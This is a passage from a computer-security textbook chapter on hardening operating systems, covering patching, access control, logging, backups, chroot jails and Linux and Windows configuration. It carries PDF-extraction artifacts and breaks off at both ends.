worm, which \\r\\nwe described in Section 6.3.\\r\\nGiven the continuing discovery of software and other vulnerabilities for com\\ufffemonly used operating systems and applications, it is critical that the system be kept as \\r\\nup to date as possible, with all critical security related patches installed. Indeed, doing \\r\\nthis addresses one of the top four key ASD mitigation strategies we listed previously. \\r\\nNearly, all commonly used systems now provide utilities that can automatically down\\ufffeload and install security updates. These tools should be configured and used to minimize \\r\\nthe time any system is vulnerable to weaknesses for which patches are available.\\r\\nOn change-controlled systems, there can be a perception that running automatic \\r\\nupdates may be detrimental, as they may on rare but significant occasions, introduce \\r\\ninstability. However, ASD notes, that the delay in testing patches can leave systems \\r\\nvulnerable to compromise, and that they believe automatic update is preferable. For \\r\\nsystems on which availability and uptime are of paramount importance, you may need \\r\\nto stage and validate all patches on test systems before deploying them in production. \\r\\nHowever, this process should be as timely as possible.\\r\\nRemove Unnecessary Services, Application, and Protocols\\r\\nBecause any of the software packages running on a system may contain software \\r\\nvulnerabilities, clearly if fewer software packages are available to run, then the risk is \\r\\nreduced. There is clearly a balance between usability, providing all software that may \\r\\nbe required at some time, with security, and a desire to limit the amount of software \\r\\ninstalled. The range of services, applications, and protocols required will vary widely \\r\\nbetween organizations, and indeed between systems within an organization. The sys\\ufffetem planning process should identify what is actually required for a given system, \\r\\nso a suitable level of functionality is provided, while eliminating software that is not \\r\\nrequired to improve security.\\r\\nThe default configuration for most distributed systems is set to maximize ease \\r\\nof use and functionality, rather than security. When performing the initial installation, \\r\\nthe supplied defaults should not be used, but rather the installation should be custom\\ufffeized so only the required packages are installed. If additional packages are needed \\r\\nlater, they can be installed when they are required. NIST SP 800-123 and many of the \\r\\nsecurity hardening guides provide lists of services, applications, and protocols that \\r\\nshould not be installed if not required.\\r\\nNIST SP 800-123 also states a strong preference for not installing unwanted \\r\\nsoftware, rather than installing then later removing or disabling it. It argues this pref\\ufffeerence because they note that many uninstall scripts fail to completely remove all \\r\\ncomponents of a package. They also note that disabling a service means that while it is \\r\\nnot available as an initial point of attack, should an attacker succeed in gaining some \\r\\naccess to a system, then disabled software could be re-enabled and used to further \\r\\ncompromise a system. It is better for security if unwanted software is not installed, \\r\\nand thus not available for use at all.\\r\\nM12_STAL0611_04_GE_C12.indd 424 10/11/17 3:02 PM\\n\\n\\n12.3 / OPERATING SYSTEMS HARDENING 425\\r\\nConfigure Users, Groups, and Authentication\\r\\nNot all users with access to a system will have the same access to all data and resources \\r\\non that system. All modern operating systems implement access controls to data and \\r\\nresources, as we discussed in Chapter 4. Nearly, all provide some form of discretionary \\r\\naccess controls. Some systems may provide role-based or mandatory access control \\r\\nmechanisms as well.\\r\\nThe system planning process should consider the categories of users on the \\r\\nsystem, the privileges they have, the types of information they can access, and how \\r\\nand where they are defined and authenticated. Some users will have elevated privi\\ufffeleges to administer the system; others will be normal users, sharing appropriate access \\r\\nto files and other data as required; and there may even be guest accounts with very \\r\\nlimited access. The last of the four key ASD mitigation strategies is to restrict elevated \\r\\nprivileges to only those users that require them. Further, it is highly desirable that \\r\\nsuch users only access elevated privileges when needed to perform some task that \\r\\nrequires them, and to otherwise access the system as a normal user. This improves \\r\\nsecurity by providing a smaller window of opportunity for an attacker to exploit the \\r\\nactions of such privileged users. Some operating systems provide special tools or \\r\\naccess mechanisms to assist administrative users to elevate their privileges only when \\r\\nnecessary, and to appropriately log these actions.\\r\\nOne key decision is whether the users, the groups they belong to, and their \\r\\nauthentication methods are specified locally on the system or will use a centralized \\r\\nauthentication server. Whichever is chosen, the appropriate details are now config\\ufffeured on the system.\\r\\nAlso at this stage, any default accounts included as part of the system installa\\ufffetion should be secured. Those which are not required should be either removed or \\r\\nat least disabled. System accounts that manage services on the system should be set \\r\\nso they cannot be used for interactive logins. And any passwords installed by default \\r\\nshould be changed to new values with appropriate security.\\r\\nAny policy that applies to authentication credentials, and especially to password \\r\\nsecurity, is also configured. This includes details of which authentication methods \\r\\nare accepted for different methods of account access. And it includes details of the \\r\\nrequired length, complexity, and age allowed for passwords. We discussed some of \\r\\nthese issues in Chapter 3.\\r\\nConfigure Resource Controls\\r\\nOnce the users and their associated groups are defined, appropriate permissions can \\r\\nbe set on data and resources to match the specified policy. This may be to limit which \\r\\nusers can execute some programs, especially those that modify the system state. Or \\r\\nit may be to limit which users can read or write data in certain directory trees. Many \\r\\nof the security hardening guides provide lists of recommended changes to the default \\r\\naccess configuration to improve security.\\r\\nInstall Additional Security Controls\\r\\nFurther security improvement may be possible by installing and configuring addi\\ufffetional security tools such as antivirus software, host-based firewalls, IDS or IPS \\r\\nsoftware, or application white-listing. Some of these may be supplied as part of the \\r\\nM12_STAL0611_04_GE_C12.indd 425 10/11/17 3:02 PM\\n\\n\\n426 CHAPTER 12 / OPERATING SYSTEM SECURITY\\r\\noperating systems installation, but not configured and enabled by default. Others are \\r\\nthird-party products that are acquired and used.\\r\\nGiven the widespread prevalence of malware, as we discussed in Chapter 6, \\r\\nappropriate anti-virus (which as noted addresses a wide range of malware types) is a \\r\\ncritical security component on many systems. Anti-virus products have traditionally \\r\\nbeen used on Windows systems, since their high use made them a preferred target for \\r\\nattackers. However, the growth in other platforms, particularly smartphones, has led \\r\\nto more malware being developed for them. Hence, appropriate anti-virus products \\r\\nshould be considered for any system as part of its security profile.\\r\\nHost-based firewalls, IDS, and IPS software also may improve security by lim\\ufffeiting remote network access to services on the system. If remote access to a service \\r\\nis not required, though some local access is, then such restrictions help secure such \\r\\nservices from remote exploit by an attacker. Firewalls are traditionally configured to \\r\\nlimit access by port or protocol, from some or all external systems. Some may also \\r\\nbe configured to allow access from or to specific programs on the systems, to further \\r\\nrestrict the points of attack, and to prevent an attacker installing and accessing their \\r\\nown malware. IDS and IPS software may include additional mechanisms such as \\r\\ntraffic monitoring, or file integrity checking to identify and even respond to some \\r\\ntypes of attack.\\r\\nAnother additional control is to white-list applications. This limits the programs \\r\\nthat can execute on the system to just those in an explicit list. Such a tool can prevent \\r\\nan attacker installing and running their own malware, and is the first of the four key \\r\\nASD mitigation strategies. While this will improve security, it functions best in an \\r\\nenvironment with a predictable set of applications that users require. Any change \\r\\nin software usage would require a change in the configuration, which may result in \\r\\nincreased IT support demands. Not all organizations or all systems will be sufficiently \\r\\npredictable to suit this type of control.\\r\\nTest the System Security\\r\\nThe final step in the process of initially securing the base operating system is secu\\uffferity testing. The goal is to ensure that the previous security configuration steps are \\r\\ncorrectly implemented, and to identify any possible vulnerabilities that must be cor\\uffferected or managed.\\r\\nSuitable checklists are included in many security hardening guides. There are \\r\\nalso programs specifically designed to review a system to ensure that a system meets \\r\\nthe basic security requirements, and to scan for known vulnerabilities and poor \\r\\nconfiguration practices. This should be done following the initial hardening of the \\r\\nsystem, and then repeated periodically as part of the security maintenance process.\\r\\n12.4 APPLICATION SECURITY\\r\\nOnce the base operating system is installed and appropriately secured, the required \\r\\nservices and applications must next be installed and configured. The steps for this \\r\\nvery much mirror the list already given in the previous section. The concern, as with \\r\\nthe base operating system, is to only install software on the system that is required to \\r\\nM12_STAL0611_04_GE_C12.indd 426 10/11/17 3:02 PM\\n\\n\\n12.4 / APPLICATION SECURITY 427\\r\\nmeet its desired functionality, in order to reduce the number of places vulnerabilities \\r\\nmay be found. On client systems, software such as Java, PDF viewers, Flash, Web \\r\\nbrowsers, and Microsoft Office are known targets and need to be secured. On server \\r\\nsystems, software that provides remote access or service, including Web, database, and \\r\\nfile access servers, is of particular concern, since an attacker may be able to exploit \\r\\nthis to gain remote access to the system.\\r\\nEach selected service or application must be installed, configured, and then \\r\\npatched to the most recent supported secure version appropriate for the system. This \\r\\nmay be from additional packages provided with the operating system distribution, or \\r\\nfrom a separate third-party package. As with the base operating system, utilizing an \\r\\nisolated, secure build network is preferred.\\r\\nApplication Configuration\\r\\nAny application specific configuration is then performed. This may include creating \\r\\nand specifying appropriate data storage areas for the application, and making appro\\ufffepriate changes to the application or service default configuration details.\\r\\nSome applications or services may include default data, scripts, or user accounts. \\r\\nThese should be reviewed, and only retained if required, and suitably secured. A well\\ufffeknown example of this is found with Web servers, which often include a number of \\r\\nexample scripts, quite a few of which are known to be insecure. These should not be \\r\\nused as supplied, but should be removed unless needed and secured.\\r\\nAs part of the configuration process, careful consideration should be given to \\r\\nthe access rights granted to the application. Again, this is of particular concern with \\r\\nremotely accessed services, such as Web and file transfer services. The server applica\\ufffetion should not be granted the right to modify files, unless that function is specifically \\r\\nrequired. A very common configuration fault seen with Web and file transfer servers \\r\\nis for all the files supplied by the service to be owned by the same “user” account \\r\\nthat the server executes as. The consequence is that any attacker able to exploit some \\r\\nvulnerability in either the server software or a script executed by the server may be \\r\\nable to modify any of these files. The large number of “Web defacement” attacks \\r\\nis clear evidence of this type of insecure configuration. Much of the risk from this \\r\\nform of attack is reduced by ensuring that most of the files can only be read, but not \\r\\nwritten, by the server. Only those files that need to be modified, to store uploaded \\r\\nform data for example, or logging details, should be writeable by the server. Instead \\r\\nthe files should mostly be owned and modified by the users on the system who are \\r\\nresponsible for maintaining the information.\\r\\nEncryption Technology\\r\\nEncryption is a key enabling technology that may be used to secure data both in \\r\\ntransit and when stored, as we discussed in Chapter 2 and in Parts Four and Five. \\r\\nIf such technologies are required for the system, then they must be configured, and \\r\\nappropriate cryptographic keys created, signed, and secured.\\r\\nIf secure network services are provided, most likely using either TLS or IPsec, \\r\\nthen suitable public and private keys must be generated for each of them. Then X.509 \\r\\ncertificates are created and signed by a suitable certificate authority, linking each \\r\\nservice identity with the public key in use, as we will discuss in Section 23.2. If secure \\r\\nM12_STAL0611_04_GE_C12.indd 427 10/11/17 3:02 PM\\n\\n\\n428 CHAPTER 12 / OPERATING SYSTEM SECURITY\\r\\nremote access is provided using Secure Shell (SSH), then appropriate server, and \\r\\npossibly client keys, must be created.\\r\\nCryptographic file systems are another use of encryption. If desired, then these \\r\\nmust be created and secured with suitable keys.\\r\\n12.5 SECURITY MAINTENANCE\\r\\nOnce the system is appropriately built, secured, and deployed, the process of main\\ufffetaining security is continuous. This results from the constantly changing environ\\ufffement, the discovery of new vulnerabilities, and hence exposure to new threats. NIST \\r\\nSP 800-123 suggests that this process of security maintenance includes the following \\r\\nadditional steps:\\r\\n• Monitoring and analyzing logging information\\r\\n• Performing regular backups\\r\\n• Recovering from security compromises\\r\\n• Regularly testing system security\\r\\n• Using appropriate software maintenance processes to patch and update all criti\\ufffecal software, and to monitor and revise configuration as needed\\r\\nWe have already noted the need to configure automatic patching and update where \\r\\npossible, or to have a timely process to manually test and install patches on high \\r\\navailability systems, and that the system should be regularly tested using checklist or \\r\\nautomated tools where possible. We will discuss the process of incident response in \\r\\nSection 17.4. We now consider the critical logging and backup procedures.\\r\\nLogging\\r\\nNIST SP 800-123 notes that “logging is a cornerstone of a sound security posture.” \\r\\nLogging is a reactive control that can only inform you about bad things that have \\r\\nalready happened. But effective logging helps ensure that in the event of a system \\r\\nbreach or failure, system administrators can more quickly and accurately identify \\r\\nwhat happened and thus most effectively focus their remediation and recovery \\r\\nefforts. The key is to ensure you capture the correct data in the logs, and are then \\r\\nable to appropriately monitor and analyze this data. Logging information can be gen\\ufffeerated by the system, network, and applications. The range of logging data acquired \\r\\nshould be determined during the system planning stage, as it depends on the security \\r\\nrequirements and information sensitivity of the server.\\r\\nLogging can generate significant volumes of information. It is important that \\r\\nsufficient space is allocated for them. A suitable automatic log rotation and archive \\r\\nsystem should also be configured to assist in managing the overall size of the logging \\r\\ninformation.\\r\\nManual analysis of logs is tedious and is not a reliable means of detecting \\r\\nadverse events. Rather, some form of automated analysis is preferred, as it is more \\r\\nlikely to identify abnormal activity. Intrusion Detection Systems, such as those we \\r\\ndiscuss in Chapter 8, perform such automated analysis.\\r\\nWe will discuss the process of logging further in Chapter 18.\\r\\nM12_STAL0611_04_GE_C12.indd 428 10/11/17 3:02 PM\\n\\n\\n12.6 / LINUX/UNIX SECURITY 429\\r\\nData Backup and Archive\\r\\nPerforming regular backups of data on a system is another critical control that assists \\r\\nwith maintaining the integrity of the system and user data. There are many reasons \\r\\nwhy data can be lost from a system, including hardware or software failures, or acci\\ufffedental or deliberate corruption. There may also be legal or operational requirements \\r\\nfor the retention of data. Backup is the process of making copies of data at regular \\r\\nintervals, allowing the recovery of lost or corrupted data over relatively short time \\r\\nperiods of a few hours to some weeks. Archive is the process of retaining copies of \\r\\ndata over extended periods of time, being months or years, in order to meet legal and \\r\\noperational requirements to access past data. These processes are often linked and \\r\\nmanaged together, although they do address distinct needs.\\r\\nThe needs and policy relating to backup and archive should be determined \\r\\nduring the system planning stage. Key decisions include whether the backup copies \\r\\nare kept online or offline, and whether copies are stored locally or transported to a \\r\\nremote site. The trade-offs include ease of implementation and cost versus greater \\r\\nsecurity and robustness against different threats.\\r\\nA good example of the consequences of poor choices here was seen in the \\r\\nattack on an Australian hosting provider in early 2011. The attackers destroyed not \\r\\nonly the live copies of thousands of customer’s sites, but also all of the online backup \\r\\ncopies. As a result, many customers who had not kept their own backup copies lost \\r\\nall of their site content and data, with serious consequences for many of them, and \\r\\nfor the hosting provider as well. In other examples, many organizations that only \\r\\nretained onsite backups have lost all their data as a result of fire or flooding in their \\r\\nIT center. These risks must be appropriately evaluated.\\r\\n12.6 LINUX/UNIX SECURITY\\r\\nHaving discussed the process of enhancing security in operating systems through \\r\\ncareful installation, configuration, and management, we now consider some specific \\r\\naspects of this process as it relates to Unix and Linux systems. Beyond the general \\r\\nguidance in this section, we will provide a more detailed discussion of Linux security \\r\\nmechanisms in Chapter 25.\\r\\nThere are a large range of resources available to assist administrators of these \\r\\nsystems, including many texts, for example [NEME10], online resources such as the \\r\\n“Linux Documentation Project,” and specific system hardening guides such as those \\r\\nprovided by the “NSA—Security Configuration Guides.” These resources should be \\r\\nused as part of the system security planning process in order to incorporate proce\\ufffedures appropriate to the security requirements identified for the system.\\r\\nPatch Management\\r\\nEnsuring that system and application code is kept up to date with security patches is \\r\\na widely recognized and critical control for maintaining security.\\r\\nModern Unix and Linux distributions typically include tools for automatically \\r\\ndownloading and installing software updates, including security updates, which can \\r\\nminimize the time a system is vulnerable to known vulnerabilities for which patches \\r\\nM12_STAL0611_04_GE_C12.indd 429 10/11/17 3:02 PM\\n\\n\\n430 CHAPTER 12 / OPERATING SYSTEM SECURITY\\r\\nexist. For example, Red Hat, Fedora, and CentOS include up2date or yum; SuSE \\r\\nincludes yast; and Debian uses apt-get, though you must run it as a cron job for \\r\\nautomatic updates. It is important to configure whichever update tool is provided on \\r\\nthe distribution in use, to install at least critical security patches in a timely manner.\\r\\nAs noted earlier, high availability systems that do not run automatic updates, \\r\\nas they may possibly introduce instability, should validate all patches on test systems \\r\\nbefore deploying them to production systems.\\r\\nApplication and Service Configuration\\r\\nConfiguration of applications and services on Unix and Linux systems is most com\\ufffemonly implemented using separate text files for each application and service. System\\ufffewide configuration details are generally located either in the “/etc” directory or \\r\\nin the installation tree for a specific application. Where appropriate, individual user \\r\\nconfigurations that can override the system defaults are located in hidden “dot” files \\r\\nin each user’s home directory. The name, format, and usage of these files are very \\r\\nmuch dependent on the particular system version and applications in use. Hence, the \\r\\nsystems administrators responsible for the secure configuration of such a system must \\r\\nbe suitably trained and familiar with them.\\r\\nTraditionally, these files were individually edited using a text editor, with any \\r\\nchanges made taking effect either when the system was next rebooted or when the \\r\\nrelevant process was sent a signal indicating that it should reload its configuration \\r\\nsettings. Current systems often provide a GUI interface to these configuration files to \\r\\nease management for novice administrators. Using such a manager may be appropri\\ufffeate for small sites with a limited number of systems. Organizations with larger num\\ufffebers of systems may instead employ some form of centralized management, with a \\r\\ncentral repository of critical configuration files that can be automatically customized \\r\\nand distributed to the systems they manage.\\r\\nThe most important changes needed to improve system security are to dis\\ufffeable services, especially remotely accessible services, and applications, that are not \\r\\nrequired, and to then ensure that applications and services that are needed are appro\\ufffepriately configured, following the relevant security guidance for each. We will provide \\r\\nfurther details on this in Section 25.5.\\r\\nUsers, Groups, and Permissions\\r\\nAs we describe in Sections 4.4 and 25.3, Unix and Linux systems implement discre\\ufffetionary access control to all file system resources. These include not only files and \\r\\ndirectories but also devices, processes, memory, and indeed most system resources. \\r\\nAccess is specified as granting read, write, and execute permissions to each of owner, \\r\\ngroup, and others, for each resource, as shown in Figure 4.5. These are set using the \\r\\nchmod command. Some systems also support extended file attributes with access \\r\\ncontrol lists that provide more flexibility, by specifying these permissions for each \\r\\nentry in a list of users and groups. These extended access rights are typically set and \\r\\ndisplayed using the getfacl and setfacl commands. These commands can also \\r\\nbe used to specify set user or set group permissions on the resource.\\r\\nInformation on user accounts and group membership are traditionally stored \\r\\nin the /etc/passwd and /etc/group files, though modern systems also have the \\r\\nM12_STAL0611_04_GE_C12.indd 430 10/11/17 3:02 PM\\n\\n\\n12.6 / LINUX/UNIX SECURITY 431\\r\\nability to import these details from external repositories queried using LDAP or NIS \\r\\nfor example. These sources of information, and indeed of any associated authentica\\ufffetion credentials, are specified in the PAM (pluggable authentication module) configu\\uffferation for the system, often using text files in the /etc/pam.d directory.\\r\\nIn order to partition access to information and resources on the system, users \\r\\nneed to be assigned to appropriate groups granting them any required access. The \\r\\nnumber and assignments to groups should be decided during the system security \\r\\nplanning process, and then configured in the appropriate information repository, \\r\\nwhether locally using the configuration files in /etc, or on some centralized data\\ufffebase. At this time, any default or generic users supplied with the system should be \\r\\nchecked, and removed if not required. Other accounts that are required, but are not \\r\\nassociated with a user that needs to login, should have login capability disabled, and \\r\\nany associated password or authentication credential removed.\\r\\nGuides to hardening Unix and Linux systems also often recommend changing \\r\\nthe access permissions for critical directories and files, in order to further limit access \\r\\nto them. Programs that set user (setuid) to root or set group (setgid) to a privileged \\r\\ngroup are key target for attackers. As we discuss in detail in Sections 4.4 and 25.3, \\r\\nsuch programs execute with superuser rights, or with access to resources belonging to \\r\\nthe privileged group, no matter which user executes them. A software vulnerability \\r\\nin such a program can potentially be exploited by an attacker to gain these elevated \\r\\nprivileges. This is known as a local exploit. A software vulnerability in a network \\r\\nserver could be triggered by a remote attacker. This is known as a remote exploit.\\r\\nIt is widely accepted that the number and size of setuid root programs in par\\ufffeticular should be minimized. They cannot be eliminated, as superuser privileges are \\r\\nrequired to access some resources on the system. The programs that manage user \\r\\nlogin, and allow network services to bind to privileged ports, are examples. However, \\r\\nother programs, that were once setuid root for programmer convenience, can function \\r\\nas well if made setgid to a suitable privileged group that has the necessary access to \\r\\nsome resource. Programs to display system state, or deliver mail, have been modified \\r\\nin this way. System hardening guides may recommend further changes, and indeed \\r\\nthe removal of some such programs that are not required on a particular system.\\r\\nRemote Access Controls\\r\\nGiven that remote exploits are of concern, it is important to limit access to only \\r\\nthose services required. This function may be provided by a perimeter firewall, as \\r\\nwe discussed in Chapter 9. However, host-based firewall or network access control \\r\\nmechanisms may provide additional defences. Unix and Linux systems support sev\\ufffeeral alternatives for this.\\r\\nThe TCP Wrappers library and tcpd daemon provide one mechanism that net\\ufffework servers may use. Lightly loaded services may be “wrapped” using tcpd, which \\r\\nlistens for connection requests on their behalf. It checks that any request is permitted \\r\\nby configured policy before accepting it and invoking the server program to handle \\r\\nit. Requests that are rejected are logged. More complex and heavily loaded servers \\r\\nincorporate this functionality into their own connection management code, using the \\r\\nTCP Wrappers library, and the same policy configuration files. These files are /etc\\r\\n/hosts.allow and /etc/hosts.deny, which should be set as policy requires.\\r\\nM12_STAL0611_04_GE_C12.indd 431 10/11/17 3:02 PM\\n\\n\\n432 CHAPTER 12 / OPERATING SYSTEM SECURITY\\r\\nThere are several host firewall programs that may be used. Linux systems pri\\ufffemarily use the iptables program to configure the netfilter kernel module. \\r\\nThis provides comprehensive, though complex, stateful packet filtering, monitoring, \\r\\nand modification capabilities. BSD-based systems (including MacOS) now use the \\r\\npf program with similar capabilities. Most systems provide an administrative utility \\r\\nto generate common configurations and to select which services will be permitted to \\r\\naccess the system. These should be used unless there are non-standard requirements, \\r\\ngiven the skill and knowledge needed to run these programs to edit their configura\\ufffetion files.\\r\\nLogging and Log Rotation\\r\\nMost applications can be configured to log with levels of detail ranging from “debug\\ufffeging” (maximum detail) to “none.” Some middle setting is usually the best choice, but \\r\\nyou should not assume that the default setting is necessarily appropriate.\\r\\nIn addition, many applications allow you to specify either a dedicated file to \\r\\nwrite application event data to, or a syslog facility to use when writing log data to \\r\\n/dev/log (see Section 25.5). If you wish to handle system logs in a consistent, \\r\\ncentralized manner, it is usually preferable for applications to send their log data \\r\\nto /dev/log. Note, however, that logrotate (also discussed in Section 25.5) \\r\\ncan be configured to rotate any logs on the system, whether written by syslogd, \\r\\nSyslog-NG, or individual applications.\\r\\nApplication Security Using a chroot jail\\r\\nSome network accessible services do not require access to the full file-system, but \\r\\nrather only need a limited set of data files and directories for their operation. FTP is \\r\\na common example of such a service. It provides the ability to download files from, \\r\\nand upload files to, a specified directory tree. If such a server were compromised and \\r\\nhad access to the entire system, an attacker could potentially access and compromise \\r\\ndata elsewhere. Unix and Linux systems provide a mechanism to run such services \\r\\nin a chroot jail, which restricts the server’s view of the file system to just a specified \\r\\nportion. This is done using the chroot system call that confines a process to some \\r\\nsubset of the file system by mapping the root of the filesystem “/” to some other \\r\\ndirectory (e.g., /srv/ftp/public). To the “chrooted” server, everything in this \\r\\nchroot jail appears to actually be in / (e.g., the “real” directory /srv/ftp/public/\\r\\netc/myconfigfile appears as /etc/myconfigfile in the chroot jail). Files in \\r\\ndirectories outside the chroot jail (e.g., /srv/www or /etc.) are not visible or \\r\\nreachable at all.\\r\\nChrooting therefore helps contain the effects of a given server being compro\\ufffemised or hijacked. The main disadvantage of this method is added complexity: a \\r\\nnumber of files (including all executable libraries used by the server), directories, and \\r\\ndevices needed must be copied into the chroot jail. Determining just what needs to go \\r\\ninto the jail for the server to work properly can be tricky, though detailed procedures \\r\\nfor chrooting many different applications are available.\\r\\nTroubleshooting a chrooted application can also be difficult. Even if an appli\\ufffecation explicitly supports this feature, it may behave in unexpected ways when run \\r\\nchrooted. Note also that if the chrooted process runs as root, it can “break out” of \\r\\nM12_STAL0611_04_GE_C12.indd 432 10/11/17 3:02 PM\\n\\n\\n12.7 / WINDOWS SECURITY 433\\r\\nthe chroot jail with little difficulty. Still, the advantages usually far outweigh the dis\\ufffeadvantages of chrooting network services.\\r\\nSecurity Testing\\r\\nThe system hardening guides such as those provided by the “NSA—Security Configu\\uffferation Guides” include security checklists for a number of Unix and Linux distribu\\ufffetions that may be followed.\\r\\nThere are also a number of commercial and open-source tools available to \\r\\nperform system security scanning and vulnerability testing. One of the best known is \\r\\n“Nessus.” This was originally an open-source tool, which was commercialized in 2005, \\r\\nthough some limited free-use versions are available. “Tripwire” is a well-known file \\r\\nintegrity checking tool that maintains a database of cryptographic hashes of moni\\ufffetored files, and scans to detect any changes, whether as a result of malicious attack, \\r\\nor simply accidental or incorrectly managed update. This again was originally an \\r\\nopen-source tool, which now has both commercial and free variants available. The \\r\\n“Nmap” network scanner is another well-known and deployed assessment tool that \\r\\nfocuses on identifying and profiling hosts on the target network, and the network \\r\\nservices they offer.\\r\\n12.7 WINDOWS SECURITY\\r\\nWe now consider some specific issues with the secure installation, configuration, \\r\\nand management of Microsoft Windows systems. These systems have for many years \\r\\nformed a significant portion of all “general purpose” system installations. Hence, they \\r\\nhave been specifically targeted by attackers, and consequently security countermea\\ufffesures are needed to deal with these challenges. The process of providing appropriate \\r\\nlevels of security still follows the general outline we describe in this chapter. Beyond \\r\\nthe general guidance in this section, we will provide more detailed discussion of \\r\\nWindows security mechanisms in Chapter 26.\\r\\nAgain, there are a large range of resources available to assist administrators\\r\\nof these systems, including online resources such as the “Microsoft Security Tools & \\r\\nChecklists,” and specific system hardening guides such as those provided by the \\r\\n“NSA—Security Configuration Guides.”\\r\\nPatch Management\\r\\nThe “Windows Update” service and the “Windows Server Update Services” assist \\r\\nwith the regular maintenance of Microsoft software, and should be configured and \\r\\nused. Many other third-party applications also provide automatic update support, \\r\\nand these should be enabled for selected applications.\\r\\nUsers Administration and Access Controls\\r\\nUsers and groups in Windows systems are defined with a Security ID (SID). This \\r\\ninformation may be stored and used locally, on a single system, in the Security \\r\\nAccount Manager (SAM). It may also be centrally managed for a group of systems \\r\\nbelonging to a domain, with the information supplied by a central Active Directory \\r\\nM12_STAL0611_04_GE_C12.indd 433 10/11/17 3:02 PM\\n\\n\\n434 CHAPTER 12 / OPERATING SYSTEM SECURITY\\r\\n(AD) system using the LDAP protocol. Most organizations with multiple systems \\r\\nwill manage them using domains. These systems can also enforce common policy \\r\\non users on any system in the domain. We will further explore the Windows security \\r\\narchitecture in Section 26.1.\\r\\nWindows systems implement discretionary access controls to system resources \\r\\nsuch as files, shared memory, and named pipes. The access control list has a number \\r\\nof entries that may grant or deny access rights to a specific SID, which may be for \\r\\nan individual user or for some group of users. Windows Vista and later systems also \\r\\ninclude mandatory integrity controls. These label all objects, such as processes and \\r\\nfiles, and all users, as being of low, medium, high, or system integrity level. Then when\\ufffeever data is written to an object, the system first ensures that the subject’s integrity is \\r\\nequal or higher than the object’s level. This implements a form of the Biba Integrity \\r\\nmodel we will discuss in Section 27.2 that specifically targets the issue of untrusted \\r\\nremote code executing in, for example Windows Internet Explorer, trying to modify \\r\\nlocal resources.\\r\\nWindows systems also define privileges, which are system wide and granted \\r\\nto user accounts. Examples of privileges include the ability to backup the computer \\r\\n(which requires overriding the normal access controls to obtain a complete backup), \\r\\nor the ability to change the system time. Some privileges are considered dangerous, \\r\\nas an attacker may use them to damage the system. Hence, they must be granted with \\r\\ncare. Others are regarded as benign, and may be granted to many or all user accounts.\\r\\nAs with any system, hardening the system configuration can include further \\r\\nlimiting the rights and privileges granted to users and groups on the system. As the \\r\\naccess control list gives deny entries greater precedence, you can set an explicit deny \\r\\npermission to prevent unauthorized access to some resource, even if the user is a \\r\\nmember of a group that otherwise grants access.\\r\\nWhen accessing files on a shared resource, a combination of share and NTFS \\r\\npermissions may be used to provide additional security and granularity. For example, \\r\\nyou can grant full control to a share, but read-only access to the files within it. If \\r\\naccess-based enumeration is enabled on shared resources, it can automatically hide \\r\\nany objects that a user is not permitted to read. This is useful with shared folders \\r\\ncontaining many users’ home directories, for example.\\r\\nYou should also ensure users with administrative rights only use them when \\r\\nrequired, and otherwise access the system as a normal user. The User Account Con\\ufffetrol (UAC) provided in Vista and later systems assists with this requirement. These \\r\\nsystems also provide Low Privilege Service Accounts that may be used for long-lived \\r\\nservice processes, such as file, print, and DNS services that do not require elevated \\r\\nprivileges.\\r\\nApplication and Service Configuration\\r\\nUnlike Unix and Linux systems, much of the configuration information in Windows \\r\\nsystems is centralized in the Registry, which forms a database of keys and values that \\r\\nmay be queried and interpreted by applications on these systems.\\r\\nChanges to these values can be made within specific applications, setting prefer\\ufffeences in the application that are then saved in the registry using the appropriate keys \\r\\nand values. This approach hides the detailed representation from the administrator. \\r\\nM12_STAL0611_04_GE_C12.indd 434 10/11/17 3:02 PM\\n\\n\\n12.8 / VIRTUALIZATION SECURITY 435\\r\\nAlternatively, the registry keys can be directly modified using the “Registry Editor.” \\r\\nThis approach is more useful for making bulk changes, such as those recommended \\r\\nin hardening guides. These changes may also be recorded in a central repository, and \\r\\npushed out whenever a user logs in to a system within a network domain.\\r\\nOther Security Controls\\r\\nGiven the predominance of malware that targets Windows systems, it is essential \\r\\nthat suitable anti-virus, anti-spyware, personal firewall, and other malware and attack \\r\\ndetection and handling software packages are installed and configured on such \\r\\nsystems. This is clearly needed for network connected systems, as shown by the high\\ufffeincidence numbers in reports such as [SYMA16]. However, as the Stuxnet attacks \\r\\nin 2010 show, even isolated systems updated using removable media are vulnerable, \\r\\nand thus must also be protected.\\r\\nCurrent generation Windows systems include some basic firewall and mal\\ufffeware countermeasure capabilities, which should certainly be used at a minimum. \\r\\nHowever, many organizations find that these should be augmented with one or \\r\\nmore of the many commercial products available. One issue of concern is undesir\\ufffeable interactions between anti-virus and other products from multiple vendors. \\r\\nCare is needed when planning and installing such products to identify possible \\r\\nadverse interactions, and to ensure the set of products in use are compatible with \\r\\neach other.\\r\\nWindows systems also support a range of cryptographic functions that may \\r\\nbe used where desirable. These include support for encrypting files and directories \\r\\nusing the Encrypting File System (EFS), and for full-disk encryption with AES using \\r\\nBitLocker.\\r\\nSecurity Testing\\r\\nThe system hardening guides such as those provided by the “NSA—Security \\r\\nConfiguration Guides” also include security checklists for various versions of \\r\\nWindows.\\r\\nThere are also a number of commercial and open-source tools available to \\r\\nperform system security scanning and vulnerability testing of Windows systems. The \\r\\n“Microsoft Baseline Security Analyzer” is a simple, free, easy-to-use tool that aims \\r\\nto help small- to medium-sized businesses improve the security of their systems by \\r\\nchecking for compliance with Microsoft’s security recommendations. Larger orga\\ufffenizations are likely better served using one of the larger, centralized, commercial \\r\\nsecurity analysis suites available.\\r\\n12.8 VIRTUALIZATION SECURITY\\r\\nVirtualization refers to a technology that provides an abstraction of the computing \\r\\nresources used by some software, which thus runs in a simulated environment called a \\r\\nvirtual machine (VM). There are many types of virtualization; however, in this section \\r\\nwe are most interested in full virtualization. This allows multiple full operating system \\r\\ninstances to execute on virtual hardware, supported by a hypervisor that manages \\r\\nM12_STAL0611_04_GE_C12.indd 435 10/11/17 3:02 PM\\n\\n\\n436 CHAPTER 12 / OPERATING SYSTEM SECURITY\\r\\naccess to the actual physical hardware resources. Benefits arising from using virtu\\ufffealization include better efficiency in the use of the physical system resources than is \\r\\ntypically seen using a single operating system instance. This is particularly evident in \\r\\nthe provision of virtualized server systems. Virtualization can also provide support for \\r\\nmultiple distinct operating systems and associated applications on the one physical \\r\\nsystem. This is more commonly seen on client systems.\\r\\nThere are a number of additional security concerns raised in virtualized systems, \\r\\nas a consequence both of the multiple operating systems executing side by side and \\r\\nof the presence of the virtualized environment and hypervisor as a layer below the \\r\\noperating system kernels and the security services they provide. [CLEE09] presents \\r\\na survey of some of the security issues arising from such a use of 